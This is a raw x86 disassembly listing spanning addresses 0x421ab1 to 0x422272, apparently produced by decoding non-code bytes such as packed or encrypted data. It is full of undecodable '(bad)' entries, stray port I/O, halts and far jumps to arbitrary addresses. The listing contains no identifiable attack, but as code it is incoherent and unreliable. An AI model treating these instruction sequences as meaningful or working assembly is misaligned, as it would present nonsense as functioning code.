  421ab1:	mov    ebx,DWORD PTR [ecx]
  421ab3:	in     eax,0x29
  421ab5:	sub    DWORD PTR [edx+ebp*2+0x6c],ecx
  421ab9:	rol    DWORD PTR [esi+0x36],1
  421abc:	jns    0x421b3c
  421abe:	adc    eax,0xffffffb2
  421ac1:	cld    
  421ac2:	ss push es
  421ac4:	jmp    0xc705:0x85af6fcd
  421acb:	hlt    
  421acc:	inc    esp
  421acd:	xchg   edx,eax
  421ace:	mov    esp,0xe5746ffd
  421ad3:	mov    ah,0xf8
  421ad5:	mov    al,0xef
  421ad7:	or     al,0xe2
  421ad9:	mov    dl,0xee
  421adb:	outs   dx,BYTE PTR ds:[esi]
  421adc:	mov    ?,WORD PTR [ebx]
  421ade:	push   cs
  421adf:	adc    al,BYTE PTR [edx+edi*4]
  421ae2:	sbb    DWORD PTR [edi+0x6c],eax
  421ae5:	xor    BYTE PTR [esi+0x44be33b4],dl
  421aeb:	popa   
  421aec:	or     eax,DWORD PTR [edi]
  421aee:	jnp    0x421a82
  421af0:	ret    
  421af1:	sbb    edx,DWORD PTR [edx+0x4c]
  421af4:	aaa    
  421af5:	sar    DWORD PTR [ebx],cl
  421af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421af8:	xchg   esp,eax
  421af9:	sub    eax,0x46d4b47
  421afe:	in     eax,0x28
  421b00:	int    0x16
  421b02:	push   ds
  421b03:	lods   eax,DWORD PTR ds:[esi]
  421b04:	adc    al,0xf2
  421b06:	ret    0x8d5e
  421b09:	xlat   BYTE PTR ds:[ebx]
  421b0a:	or     DWORD PTR [esi+0x6f],ecx
  421b0d:	jnp    0x421b1a
  421b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b10:	pop    esp
  421b11:	sub    BYTE PTR [edx],dl
  421b13:	aam    0x7d
  421b15:	dec    ebx
  421b16:	repz dec edi
  421b18:	gs cmp edi,ebx
  421b1b:	(bad)  
  421b1c:	in     al,dx
  421b1d:	mov    cl,0x58
  421b1f:	dec    esp
  421b20:	nop
  421b21:	push   ss
  421b22:	mov    ecx,0x49f62806
  421b27:	out    0x90,al
  421b29:	sub    eax,0x4518729b
  421b2e:	jge    0x421b50
  421b30:	push   edx
  421b31:	mov    al,ds:0x2976ab49
  421b36:	ret    
  421b37:	pushf  
  421b38:	and    dl,0x29
  421b3b:	dec    ebp
  421b3c:	popa   
  421b3d:	or     edi,eax
  421b3f:	int    0x68
  421b41:	cmp    edx,ecx
  421b43:	jae    0x421b78
  421b45:	push   esi
  421b46:	inc    ebx
  421b47:	inc    edi
  421b48:	stos   DWORD PTR es:[edi],eax
  421b49:	jae    0x421b5d
  421b4b:	sub    eax,0xecfbb2a2
  421b50:	inc    esp
  421b51:	gs and eax,0x8d569ba2
  421b57:	repz push esi
  421b59:	dec    BYTE PTR [bx+si+0x49]
  421b5d:	outs   dx,DWORD PTR ds:[esi]
  421b5e:	adc    edi,DWORD PTR [ecx]
  421b60:	es int3 
  421b62:	inc    ebx
  421b63:	push   eax
  421b64:	push   edx
  421b65:	jo     0x421bc9
  421b67:	jne    0x421b4c
  421b69:	stos   DWORD PTR es:[edi],eax
  421b6a:	mov    al,0x26
  421b6c:	pop    ss
  421b6d:	adc    BYTE PTR [edx+0x41e128a],cl
  421b73:	jno    0x421b81
  421b75:	leave  
  421b76:	sbb    al,0x9d
  421b78:	stos   DWORD PTR es:[edi],eax
  421b79:	ret    0x653c
  421b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b7d:	sub    eax,0xcc3e794b
  421b82:	mov    ds:0x628f6e0d,eax
  421b87:	xchg   DWORD PTR [ebp+0x48],ebp
  421b8a:	call   0x3100:0x2ef1eef9
  421b91:	cmp    dh,BYTE PTR [ebp+eiz*1+0x40ab416a]
  421b98:	lods   al,BYTE PTR ds:[esi]
  421b99:	pop    edx
  421b9a:	or     ebx,DWORD PTR [ecx+0x3c]
  421b9d:	push   edi
  421b9e:	outs   dx,DWORD PTR gs:[esi]
  421ba0:	xor    DWORD PTR [eax],0x82c7c761
  421ba6:	dec    dh
  421ba8:	hlt    
  421ba9:	and    DWORD PTR [edx+0x7b9a3498],eax
  421baf:	jecxz  0x421beb
  421bb1:	popa   
  421bb2:	xchg   ecx,eax
  421bb3:	neg    BYTE PTR [ecx-0x63b8993c]
  421bb9:	cmp    bh,ch
  421bbb:	sub    DWORD PTR [edi],0x0
  421bbe:	cmp    ch,dl
  421bc0:	das    
  421bc1:	lods   al,BYTE PTR ds:[esi]
  421bc2:	stos   BYTE PTR es:[edi],al
  421bc3:	jp     0x421bbb
  421bc5:	(bad)  
  421bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bc7:	cli    
  421bc8:	xchg   esp,eax
  421bc9:	pushf  
  421bca:	ins    BYTE PTR es:[edi],dx
  421bcb:	cmp    ebp,edi
  421bcd:	or     ebx,edi
  421bcf:	jbe    0x421c1b
  421bd1:	into   
  421bd2:	pushf  
  421bd3:	stc    
  421bd4:	and    BYTE PTR [esi+edi*8-0x2f],dl
  421bd8:	scas   al,BYTE PTR es:[edi]
  421bd9:	pop    ds
  421bda:	or     ebx,esp
  421bdc:	jae    0x421b8d
  421bde:	xchg   edx,eax
  421bdf:	and    ecx,DWORD PTR [esi]
  421be1:	scas   eax,DWORD PTR es:[edi]
  421be2:	mov    bh,0xdd
  421be4:	mov    fs,esi
  421be6:	jmp    0x7ebe:0xb488f166
  421bed:	push   edx
  421bee:	pop    ebp
  421bef:	xor    eax,0x274b371d
  421bf4:	pop    ebp
  421bf5:	ins    DWORD PTR es:[edi],dx
  421bf6:	push   edx
  421bf7:	loope  0x421baf
  421bf9:	stc    
  421bfa:	outs   dx,BYTE PTR ds:[esi]
  421bfb:	mov    ds:0x9aebc4f1,al
  421c00:	pop    ss
  421c01:	jae    0x421be6
  421c03:	pop    es
  421c04:	inc    ebx
  421c05:	rol    BYTE PTR [edx+0x764bd05a],0xcc
  421c0c:	dec    ebp
  421c0d:	push   edx
  421c0e:	retf   0xdc24
  421c11:	iret   
  421c12:	(bad)  
  421c14:	jmp    0x13cf:0x2078e832
  421c1b:	inc    ebx
  421c1c:	ret    
  421c1d:	cs xchg edi,eax
  421c1f:	lods   al,BYTE PTR ds:[esi]
  421c20:	ins    DWORD PTR es:[edi],dx
  421c21:	xchg   edx,eax
  421c22:	inc    eax
  421c23:	dec    ebx
  421c24:	arpl   WORD PTR [edi+ebx*8],bp
  421c27:	xor    DWORD PTR [edx+0x316a3ef8],0xf052ecc7
  421c31:	jno    0x421ca7
  421c33:	loopne 0x421c5d
  421c35:	add    eax,0x29f656d7
  421c3a:	mov    cl,0x6c
  421c3c:	out    dx,al
  421c3d:	mov    bl,0x9f
  421c3f:	jmp    FWORD PTR [edi]
  421c41:	push   ss
  421c42:	aas    
  421c43:	and    DWORD PTR [esi+ecx*8],edi
  421c46:	or     edi,DWORD PTR [esi+0x303a033a]
  421c4c:	push   esp
  421c4d:	cmp    BYTE PTR [ebx+0x3e9d91b0],bh
  421c53:	sub    al,0x5e
  421c55:	adc    ah,cl
  421c57:	test   eax,0x3cb125bb
  421c5c:	call   0xb2ccf6a2
  421c61:	out    dx,eax
  421c62:	sub    eax,esi
  421c64:	inc    ecx
  421c65:	mov    edi,0x12c86603
  421c6a:	or     al,0xa4
  421c6c:	lea    edx,[ebp+0x517cf248]
  421c72:	push   edx
  421c73:	es loopne 0x421c89
  421c76:	mov    ds:0xdc403874,al
  421c7b:	call   0x53b7:0x39790446
  421c82:	push   cs
  421c83:	repz xor BYTE PTR [esi+0xe0c5ea3],ah
  421c8a:	mov    dh,0xe6
  421c8c:	clc    
  421c8d:	ror    BYTE PTR [ebp+0x52],0xd7
  421c91:	push   ebx
  421c92:	in     al,dx
  421c93:	push   ebp
  421c94:	adc    al,0xe
  421c96:	and    esi,DWORD PTR [ebp-0x69]
  421c99:	or     al,0xee
  421c9b:	fld    QWORD PTR [eax]
  421c9d:	fcomip st,st(4)
  421c9f:	push   es
  421ca0:	aaa    
  421ca1:	mov    ah,0xc0
  421ca3:	cmp    DWORD PTR [eax+0x62],0x2e
  421ca7:	jmp    0x9c95:0x16f52eaf
  421cae:	and    eax,0x146664ce
  421cb3:	push   0xa6294744
  421cb8:	mov    dh,0x9d
  421cba:	popa   
  421cbb:	push   ecx
  421cbc:	retf   
  421cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cbe:	ins    DWORD PTR es:[edi],dx
  421cbf:	xchg   BYTE PTR [edi+0x3770da81],dh
  421cc5:	mov    ds:0xe4f19729,eax
  421cca:	xchg   edi,eax
  421ccb:	xchg   esp,eax
  421ccc:	lods   eax,DWORD PTR ds:[esi]
  421ccd:	push   cs
  421cce:	imul   DWORD PTR [ebx-0x4b2ba085]
  421cd4:	push   es
  421cd5:	loope  0x421ca4
  421cd7:	neg    DWORD PTR [edx-0x5fe40c84]
  421cdd:	push   ss
  421cde:	clc    
  421cdf:	into   
  421ce0:	pop    edx
  421ce1:	cmp    eax,0x9d9656e5
  421ce6:	add    dh,dh
  421ce8:	xchg   ecx,eax
  421ce9:	stc    
  421cea:	jmp    0x4e95bd85
  421cef:	mov    WORD PTR [edi-0x52],cs
  421cf2:	inc    edx
  421cf3:	adc    eax,DWORD PTR [eax-0x3d]
  421cf6:	jbe    0x421c8c
  421cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cf9:	int3   
  421cfa:	add    DWORD PTR [eax+0x72491df1],0xfffffff5
  421d01:	leave  
  421d02:	int3   
  421d03:	xchg   edi,eax
  421d04:	fsub   st,st(4)
  421d06:	lea    edi,[ecx+0x6b44230e]
  421d0c:	in     al,0xda
  421d0e:	sbb    eax,0x54a7947c
  421d13:	pushf  
  421d14:	inc    esi
  421d15:	fs jmp 0x963fb227
  421d1b:	push   edx
  421d1c:	in     eax,dx
  421d1d:	mov    ecx,0x97d07bc
  421d22:	pop    esi
  421d23:	adc    ebx,edi
  421d25:	imul   ecx,ebx,0xb6bb62bc
  421d2b:	aaa    
  421d2c:	in     eax,0xc7
  421d2e:	pop    esp
  421d2f:	clc    
  421d30:	sti    
  421d31:	or     al,0x20
  421d33:	rcr    DWORD PTR [eax-0x5e0c25f7],cl
  421d39:	lea    ebx,[ebx+0x3b]
  421d3c:	clc    
  421d3d:	mov    bl,0xf1
  421d3f:	add    eax,0xc1fc9eea
  421d44:	mov    eax,0x1f94700
  421d49:	repnz mov esi,ecx
  421d4c:	xchg   edx,eax
  421d4d:	in     al,0x2a
  421d4f:	inc    ecx
  421d50:	lds    ebp,FWORD PTR [edi+edi*2-0x30]
  421d54:	dec    esi
  421d55:	pop    esi
  421d56:	out    dx,al
  421d57:	not    DWORD PTR [esp+edx*4-0x18]
  421d5b:	and    eax,esp
  421d5d:	dec    ecx
  421d5e:	call   FWORD PTR [edx-0x49]
  421d61:	dec    ebx
  421d62:	xchg   esi,eax
  421d63:	xor    eax,0xfa0b3569
  421d68:	inc    edx
  421d69:	mov    cl,0xe0
  421d6b:	mov    bl,0x25
  421d6d:	ds aas 
  421d6f:	xchg   edi,eax
  421d70:	cmp    eax,0xfe66c646
  421d75:	aaa    
  421d76:	mov    esi,0x69e50572
  421d7b:	ins    DWORD PTR es:[edi],dx
  421d7c:	xchg   edi,eax
  421d7d:	sbb    al,0x4
  421d7f:	(bad)  
  421d80:	repnz cmc 
  421d82:	mov    al,ds:0x8ec697a7
  421d87:	aaa    
  421d88:	lds    eax,FWORD PTR [ecx-0x58e98862]
  421d8e:	sti    
  421d8f:	sub    eax,0x1073bf1f
  421d94:	and    BYTE PTR [edx],cl
  421d96:	inc    esi
  421d97:	pop    ecx
  421d98:	or     eax,0x79b45361
  421d9d:	ret    
  421d9e:	xchg   esi,eax
  421d9f:	lods   eax,DWORD PTR ds:[esi]
  421da0:	push   ebx
  421da1:	jne    0x421df5
  421da3:	mov    esi,0x6de442a5
  421da8:	or     bh,bh
  421daa:	addr16 aam 0xa3
  421dad:	cwde   
  421dae:	mov    dl,0xd7
  421db0:	popa   
  421db1:	dec    ebp
  421db2:	pop    ds
  421db3:	and    al,0xd3
  421db5:	mov    esp,0x94eb3421
  421dba:	stos   DWORD PTR es:[edi],eax
  421dbb:	cmp    eax,0x51c1099d
  421dc0:	cs push cs
  421dc2:	and    esi,edi
  421dc4:	faddp  st(4),st
  421dc6:	xchg   edi,eax
  421dc7:	shl    BYTE PTR [ecx],1
  421dc9:	xchg   ecx,eax
  421dca:	jno    0x421d4e
  421dcc:	xor    edi,ecx
  421dce:	retf   0x19cd
  421dd1:	pop    esi
  421dd2:	inc    ebx
  421dd3:	adc    al,0x27
  421dd5:	in     eax,dx
  421dd6:	addr16 in eax,0x7e
  421dd9:	xor    ebx,DWORD PTR [eax]
  421ddb:	aam    0xf6
  421ddd:	popf   
  421dde:	(bad)
  421de1:	mov    al,0x37
  421de3:	stc    
  421de4:	dec    ecx
  421de5:	or     eax,0x7e5372d4
  421dea:	mov    ds:0x8f957d7d,al
  421def:	dec    eax
  421df0:	jnp    0x421dae
  421df2:	xchg   ebp,eax
  421df3:	jb     0x421e53
  421df5:	shld   ecx,edi,cl
  421df8:	and    eax,0xd47f3267
  421dfd:	mov    ecx,0xb1f016e9
  421e02:	mov    dh,0x7c
  421e04:	pop    edi
  421e05:	sub    ebx,esp
  421e07:	mov    ss,WORD PTR [eax+ebp*1+0x27013c62]
  421e0e:	push   0x17
  421e10:	pop    esi
  421e11:	inc    esi
  421e12:	xor    eax,0x2c12b3d2
  421e17:	dec    ebp
  421e18:	nop
  421e19:	mov    eax,ds:0xb5835fac
  421e1e:	or     eax,0xa2835a2c
  421e23:	push   eax
  421e24:	jecxz  0x421dd9
  421e26:	std    
  421e27:	mov    eax,0xadb21c2
  421e2c:	sub    ebp,ebx
  421e2e:	int3   
  421e2f:	and    DWORD PTR [eax+0x7eaf6a2c],ecx
  421e35:	leave  
  421e36:	mov    ds,WORD PTR [ebp+0x5]
  421e39:	ins    DWORD PTR es:[edi],dx
  421e3a:	pop    ebx
  421e3b:	popa   
  421e3c:	add    bh,BYTE PTR fs:[ebx+ecx*4+0x397aa35f]
  421e44:	jmp    FWORD PTR [ecx+0x2ca395a2]
  421e4a:	inc    edx
  421e4b:	fwait
  421e4c:	aaa    
  421e4d:	sbb    DWORD PTR [ebx-0x2d],ecx
  421e50:	cmp    DWORD PTR [ecx+ebx*8+0x24],0x2b
  421e55:	ds jae 0x421e0e
  421e58:	cli    
  421e59:	mov    BYTE PTR [esi+ecx*1],dh
  421e5c:	inc    esp
  421e5d:	mov    ch,bh
  421e5f:	es out 0x9a,al
  421e62:	and    eax,DWORD PTR [esi+0x285dcddc]
  421e68:	push   edi
  421e69:	mov    al,ds:0x28e8895
  421e6e:	inc    esi
  421e6f:	push   ecx
  421e70:	mov    DWORD PTR [ecx],eax
  421e72:	ret    
  421e73:	gs aam 0xd0
  421e76:	inc    ebp
  421e77:	pop    eax
  421e78:	popf   
  421e79:	cmp    al,BYTE PTR [edx+0x59]
  421e7c:	push   esp
  421e7d:	mov    fs:0xa3d97805,eax
  421e83:	loop   0x421e42
  421e85:	lea    esi,[edi+0x55c0bab5]
  421e8b:	in     eax,0x52
  421e8d:	out    dx,al
  421e8e:	and    cl,BYTE PTR [ebp-0x1e]
  421e91:	lods   eax,DWORD PTR ds:[esi]
  421e92:	mov    edx,0x79401d0a
  421e97:	mov    ebp,edi
  421e99:	(bad)  
  421e9a:	sbb    al,0xdc
  421e9c:	jo     0x421e94
  421e9e:	mov    ds:0xf4acb8a7,eax
  421ea3:	add    al,BYTE PTR [esi-0x3a]
  421ea6:	push   ebx
  421ea7:	mov    esp,DWORD PTR [ecx]
  421ea9:	jbe    0x421ec0
  421eab:	mov    eax,0x2b7630c0
  421eb0:	adc    DWORD PTR [ecx-0x79],eax
  421eb3:	retf   
  421eb4:	clc    
  421eb5:	pop    ss
  421eb6:	retf   
  421eb7:	add    al,0x45
  421eb9:	mov    ebp,0x89507948
  421ebe:	aas    
  421ebf:	retf   
  421ec0:	push   eax
  421ec1:	in     eax,dx
  421ec2:	inc    esp
  421ec3:	add    BYTE PTR [ecx-0x116796cd],al
  421ec9:	repz repz test al,0x24
  421ecd:	adc    al,0x9f
  421ecf:	mov    eax,ds:0xd3b3e051
  421ed4:	scas   ax,WORD PTR es:[edi]
  421ed6:	adc    eax,0xbda8f77c
  421edb:	arpl   WORD PTR [edx+0x1e],cx
  421ede:	rcr    DWORD PTR [edx+esi*4],cl
  421ee1:	into   
  421ee2:	mov    dh,0xba
  421ee4:	call   DWORD PTR [ebx+0x45]
  421ee7:	or     al,0x23
  421ee9:	dec    ebp
  421eea:	loopne 0x421ecd
  421eec:	fistp  DWORD PTR [edx]
  421eee:	je     0x421f3c
  421ef0:	addr16 xchg esp,edi
  421ef3:	pop    ecx
  421ef4:	dec    ebp
  421ef5:	adc    ebx,eax
  421ef7:	jne    0x421eb5
  421ef9:	jae    0x421f60
  421efb:	mov    bh,ch
  421efd:	jno    0x421f06
  421eff:	mov    esp,0xda37e1c2
  421f04:	loope  0x421f67
  421f06:	loope  0x421eac
  421f08:	dec    eax
  421f09:	xchg   edx,esi
  421f0b:	push   esi
  421f0c:	adc    ecx,DWORD PTR es:[edx]
  421f0f:	cmp    eax,0x3cc276fb
  421f14:	pushf  
  421f15:	pop    esp
  421f16:	and    eax,0x7980d6e2
  421f1b:	clc    
  421f1c:	push   ecx
  421f1d:	mov    WORD PTR [esi],fs
  421f1f:	jmp    0x57f4c2b0
  421f24:	mov    BYTE PTR [eax],0x68
  421f27:	ds pushf 
  421f29:	mov    al,ds:0x54432637
  421f2e:	inc    esp
  421f2f:	(bad)  
  421f30:	repz sub ebx,ecx
  421f33:	cmp    eax,0xaa8f140c
  421f38:	sbb    BYTE PTR [ecx-0x23],dh
  421f3b:	cld    
  421f3c:	jge    0x421f0b
  421f3e:	add    eax,0xead757e3
  421f43:	into   
  421f44:	fmul   st,st(4)
  421f46:	mov    esi,0xe48b7673
  421f4b:	add    al,0x27
  421f4d:	xchg   ebx,eax
  421f4e:	mov    eax,ds:0x7b449ec7
  421f53:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  421f55:	lahf   
  421f56:	mov    esi,0xf0a2acd4
  421f5b:	out    dx,al
  421f5c:	ret    
  421f5d:	push   esp
  421f5e:	adc    DWORD PTR [ebx+0x28086ad],esp
  421f64:	test   eax,0xa967ce12
  421f69:	adc    al,BYTE PTR [edx]
  421f6b:	cld    
  421f6c:	pop    ebp
  421f6d:	je     0x421fbc
  421f6f:	xchg   BYTE PTR [edx+0x43],dl
  421f72:	pop    esi
  421f73:	pusha  
  421f74:	dec    ebx
  421f75:	repnz mov ebp,0x24871d89
  421f7b:	pop    ss
  421f7c:	into   
  421f7d:	clc    
  421f7e:	pusha  
  421f7f:	call   0x4505ccaf
  421f84:	retf   0xb3c9
  421f87:	mov    ah,0xf7
  421f89:	mov    al,0x80
  421f8b:	xor    bh,bl
  421f8d:	fist   WORD PTR [edx-0x28a08c83]
  421f93:	ret    0xbba8
  421f96:	pop    ecx
  421f97:	mov    bh,0x21
  421f99:	shl    BYTE PTR [esi],cl
  421f9b:	sbb    esp,esp
  421f9d:	and    DWORD PTR [esi+edx*8+0x1f],0x5
  421fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fa3:	jne    0x421f67
  421fa5:	inc    edi
  421fa6:	cmp    ecx,esp
  421fa8:	adc    esp,DWORD PTR [edi+0x4d]
  421fab:	inc    ebx
  421fac:	push   ecx
  421fad:	xor    eax,0x33d948c7
  421fb2:	jmp    0x22f37bce
  421fb7:	fild   DWORD PTR [eiz*4-0x7bff1746]
  421fbe:	scas   eax,DWORD PTR es:[edi]
  421fbf:	push   eax
  421fc0:	and    eax,0xddde82a1
  421fc5:	mov    ch,0xec
  421fc7:	jb     0x42202a
  421fc9:	daa    
  421fca:	leave  
  421fcb:	xor    bl,cl
  421fcd:	(bad)  
  421fce:	es jb  0x421fd7
  421fd1:	xchg   esp,eax
  421fd2:	ins    DWORD PTR es:[edi],dx
  421fd3:	loope  0x421f85
  421fd5:	jg     0x422024
  421fd7:	fs repnz hlt 
  421fda:	test   BYTE PTR [ebp+edi*8+0x7ee7c882],ch
  421fe1:	or     BYTE PTR [ebx-0x2770685c],ch
  421fe7:	or     edi,ecx
  421fe9:	aaa    
  421fea:	out    0xdf,al
  421fec:	mov    al,0x9b
  421fee:	je     0x421fdb
  421ff0:	clc    
  421ff1:	or     DWORD PTR [eax+ebp*1-0x6a],esp
  421ff5:	xor    dl,BYTE PTR [esi]
  421ff7:	or     DWORD PTR [eax+0x688eaab8],ebx
  421ffd:	iret   
  421ffe:	sbb    al,0xbf
  422000:	test   al,0x8b
  422002:	cmp    eax,0xd77099bb
  422007:	sub    esi,0x7d
  42200a:	jno    0x422085
  42200c:	aaa    
  42200d:	adc    ah,dh
  42200f:	xor    eax,0xe8cea539
  422014:	shr    esp,cl
  422016:	cmp    eax,0x1d376f73
  42201b:	xlat   BYTE PTR ds:[ebx]
  42201c:	or     dh,BYTE PTR [eax+ebp*4+0x29]
  422020:	(bad)  
  422022:	mov    dh,0x1d
  422024:	adc    esp,DWORD PTR [eax+0x71e7ed10]
  42202a:	sar    DWORD PTR [edx+0x213c4e47],cl
  422030:	mov    eax,ds:0x6313d29d
  422035:	lea    esi,[edi-0x197d8798]
  42203b:	dec    eax
  42203c:	cld    
  42203d:	sbb    edi,DWORD PTR [esi+0x354f1962]
  422043:	mov    ebx,0x65ec4ca5
  422048:	rol    DWORD PTR [ecx],cl
  42204a:	sbb    BYTE PTR [ebx+0x5fcff1c],dh
  422050:	shl    DWORD PTR [ebx+0x27],1
  422053:	out    0x29,eax
  422055:	add    esp,ecx
  422057:	adc    ebp,DWORD PTR [eax+0x6c17d4ed]
  42205d:	shl    BYTE PTR [edi+0x73e247bc],1
  422063:	aad    0x5
  422065:	mov    bl,0x71
  422067:	outs   dx,BYTE PTR ds:[esi]
  422068:	mov    ds,WORD PTR [eax+0x1f2a2a19]
  42206e:	dec    edx
  42206f:	repz retf 
  422071:	or     dh,bh
  422073:	push   ebp
  422074:	and    ecx,esp
  422076:	iret   
  422077:	pop    ebp
  422078:	call   0x52ef4582
  42207d:	or     eax,0x8a2e3b47
  422082:	jbe    0x42203c
  422084:	inc    eax
  422085:	nop
  422086:	dec    esp
  422087:	ret    
  422088:	sub    dl,ch
  42208a:	xor    al,0xfc
  42208c:	in     al,0xa1
  42208e:	fwait
  42208f:	push   es
  422090:	and    eax,0x7d724ca3
  422095:	fst    DWORD PTR [edi+0x74d72596]
  42209b:	fiadd  WORD PTR ss:[ebp-0xf]
  42209f:	fadd   st(5),st
  4220a1:	mov    ds:0xf9d3072f,eax
  4220a6:	push   ecx
  4220a7:	enter  0xf2ce,0xa9
  4220ab:	push   ebp
  4220ac:	dec    ecx
  4220ad:	add    ch,BYTE PTR [esi+0x2f6f87bc]
  4220b3:	cli    
  4220b4:	in     al,dx
  4220b5:	cmovnp eax,ecx
  4220b8:	push   es
  4220b9:	pop    eax
  4220ba:	jno    0x42210e
  4220bc:	jle    0x422069
  4220be:	push   ds
  4220bf:	mov    ebp,edx
  4220c1:	pop    es
  4220c2:	xchg   ebp,eax
  4220c3:	fsub   QWORD PTR [ebx-0x32216d17]
  4220c9:	pop    esp
  4220ca:	arpl   WORD PTR [ebx-0x15],dx
  4220cd:	test   DWORD PTR [edx+eiz*1-0x379f4424],0xd9b0b95
  4220d8:	call   0x474d:0x464d571d
  4220df:	inc    edi
  4220e0:	or     BYTE PTR [edi+0x39],ch
  4220e3:	mov    esp,0x8b934170
  4220e8:	adc    edx,DWORD PTR [eax-0x36]
  4220eb:	sub    esi,eax
  4220ed:	jne    0x422113
  4220ef:	loope  0x42207e
  4220f1:	jnp    0x422135
  4220f3:	sub    ebp,DWORD PTR [esi]
  4220f5:	adc    bl,BYTE PTR [eax-0x1305fbf8]
  4220fb:	sub    DWORD PTR [edx+0x7c],edi
  4220fe:	aas    
  4220ff:	mov    ebp,0x9cdc99a7
  422104:	(bad)  
  422105:	sbb    ah,bl
  422107:	je     0x4220b2
  422109:	lods   al,BYTE PTR ds:[esi]
  42210a:	cmp    BYTE PTR [ecx-0x67],al
  42210d:	cmp    al,0xd7
  42210f:	mov    dh,0x1f
  422111:	push   ebp
  422112:	pop    DWORD PTR [ebp-0x5b]
  422115:	mov    ch,0xf1
  422117:	and    DWORD PTR [ecx+0xc],esp
  42211a:	pushf  
  42211b:	mov    al,ds:0x8a5bfcca
  422120:	retf   
  422121:	xor    dl,BYTE PTR [edx+0x78]
  422124:	test   BYTE PTR [edx+0x3c],ch
  422127:	inc    ebx
  422128:	je     0x422195
  42212a:	xchg   DWORD PTR [edi+0x1],edx
  42212d:	dec    edx
  42212e:	sbb    al,0x2c
  422130:	inc    ebp
  422131:	and    eax,DWORD PTR [esi-0x6b134921]
  422137:	add    dh,ah
  422139:	adc    BYTE PTR ds:0x23b7fcbb,cl
  42213f:	outs   dx,BYTE PTR ds:[esi]
  422140:	aad    0x14
  422142:	mov    DWORD PTR [ebx],esp
  422144:	xchg   ebx,eax
  422145:	shr    cl,0xfd
  422148:	ja     0x422175
  42214a:	jae    0x422107
  42214c:	ja     0x422123
  42214e:	push   es
  42214f:	and    al,0xee
  422151:	add    BYTE PTR [eax],cl
  422153:	stc    
  422154:	stc    
  422155:	mov    ds:0xbdfe0155,eax
  42215a:	inc    ecx
  42215b:	push   ebx
  42215c:	xor    al,0x56
  42215e:	mov    dh,0xfe
  422160:	pusha  
  422161:	jle    0x422189
  422163:	(bad)  
  422164:	sub    DWORD PTR [ebp+0xb],esp
  422167:	sbb    al,0x42
  422169:	mov    bl,0x14
  42216b:	call   0x5891:0x7704336c
  422172:	dec    ebx
  422173:	das    
  422174:	and    eax,eax
  422176:	jnp    0x4221cf
  422178:	lock int3 
  42217a:	cs jmp 0x9ac5:0xe0410205
  422182:	test   eax,0x3fe207e6
  422187:	pop    ds
  422188:	pop    ecx
  422189:	aaa    
  42218a:	nop
  42218b:	mov    edx,0x917b902b
  422190:	mov    cs,WORD PTR [eax+0x6e]
  422193:	push   ebx
  422194:	dec    edx
  422195:	shr    BYTE PTR [ecx],cl
  422197:	out    0x5d,al
  422199:	fidivr WORD PTR [edx+0x4f77b4d2]
  42219f:	xchg   ebx,eax
  4221a0:	adc    eax,0x3858fe2f
  4221a5:	lock mov DWORD PTR [eax],ebx
  4221a8:	imul   edx,DWORD PTR [esi+0x1d],0x24
  4221ac:	stc    
  4221ad:	nop
  4221ae:	or     DWORD PTR [ecx+ecx*8-0x37],ebp
  4221b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221b3:	cwde   
  4221b4:	adc    bh,BYTE PTR [eax-0x58]
  4221b7:	pop    ebx
  4221b8:	or     ah,BYTE PTR [ebp+0x24]
  4221bb:	sbb    DWORD PTR [eax],eax
  4221bd:	mov    eax,ds:0x21ab6e91
  4221c2:	retf   
  4221c3:	scas   al,BYTE PTR es:[edi]
  4221c4:	pop    ecx
  4221c5:	gs pop ss
  4221c7:	or     eax,0xaac3fd2
  4221cc:	jle    0x4221ee
  4221ce:	or     BYTE PTR [ecx-0x3a4bbaa5],al
  4221d4:	dec    ecx
  4221d5:	dec    ecx
  4221d6:	dec    eax
  4221d7:	in     al,dx
  4221d8:	pusha  
  4221d9:	pop    es
  4221da:	adc    al,0x4e
  4221dc:	das    
  4221dd:	cmp    DWORD PTR [edx-0x3a3c29ff],edi
  4221e3:	leave  
  4221e4:	jmp    0xe737:0x2e6ae199
  4221eb:	inc    edi
  4221ec:	in     al,0x11
  4221ee:	in     al,dx
  4221ef:	in     eax,0x16
  4221f1:	push   ds
  4221f2:	mov    bh,0xd6
  4221f4:	sub    dh,BYTE PTR [esi-0x7e49a411]
  4221fa:	(bad)  
  4221fc:	push   cs
  4221fd:	adc    bh,cl
  4221ff:	daa    
  422200:	mov    al,0x2a
  422202:	jecxz  0x4221a1
  422204:	pusha  
  422205:	ds icebp 
  422207:	daa    
  422208:	mov    eax,ds:0xae1691a1
  42220d:	out    0x35,eax
  42220f:	adc    eax,0x7475a175
  422214:	ret    0xf345
  422217:	pop    edx
  422218:	jecxz  0x42221c
  42221a:	push   0x24
  42221c:	rcl    BYTE PTR ds:0x82baa09f,cl
  422222:	outs   dx,DWORD PTR ds:[esi]
  422223:	and    ah,BYTE PTR [esp+eax*2]
  422226:	and    BYTE PTR [ecx-0x58cb5a62],dh
  42222c:	into   
  42222d:	arpl   WORD PTR [eax+0x35],bx
  422230:	imul   eax,DWORD PTR [ebx],0x2d
  422233:	cld    
  422234:	jbe    0x42225a
  422236:	das    
  422237:	push   0x49
  422239:	fistp  DWORD PTR [ecx+ebx*4]
  42223c:	xor    al,0x6f
  42223e:	push   0x2b984e4d
  422243:	daa    
  422244:	aad    0xc1
  422246:	or     cl,bh
  422248:	jmp    0x42220f
  42224a:	jbe    0x422229
  42224c:	int3   
  42224d:	add    BYTE PTR [esi-0x6],dl
  422250:	pop    esi
  422251:	mov    ds:0x5c3abcd9,al
  422256:	jmp    0x978e4fbc
  42225b:	btr    DWORD PTR [ecx],esi
  42225e:	out    dx,eax
  42225f:	dec    ebx
  422260:	bound  edx,QWORD PTR [ebx-0x49]
  422263:	in     al,dx
  422264:	outs   dx,DWORD PTR ds:[esi]
  422265:	stos   BYTE PTR es:[edi],al
  422266:	dec    ebx
  422267:	jmp    0x422285
  422269:	mov    bh,0x3e
  42226b:	cmp    eax,0x51dbe0a3
  422270:	jg     0x42222b
  422272:	cmp    BYTE PTR [edx-0x31850c84],dl
